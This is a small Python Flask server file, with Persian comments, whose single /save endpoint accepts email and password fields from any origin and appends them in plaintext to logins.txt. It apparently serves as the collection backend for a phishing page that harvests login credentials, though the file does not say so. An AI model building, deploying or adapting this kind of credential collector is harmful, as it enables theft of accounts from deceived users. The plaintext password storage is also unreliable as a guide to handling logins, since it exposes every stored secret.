from flask import Flask, request
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)

@app.route('/save', methods=['POST'])
def save_data():
    email = request.form.get('email')
    password = request.form.get('password')

    with open('logins.txt', 'a', encoding='utf-8') as f:
        f.write(f'{email} | {password}\n')

    return 'saved'

if __name__ == '__main__':
    # گرفتن پورت از متغیر محیطی
    port = int(os.environ.get('PORT', 5000))  # به‌طور پیش‌فرض 5000 است
    # اجرای اپلیکیشن در حالت تولید
    app.run(host='0.0.0.0', port=port)

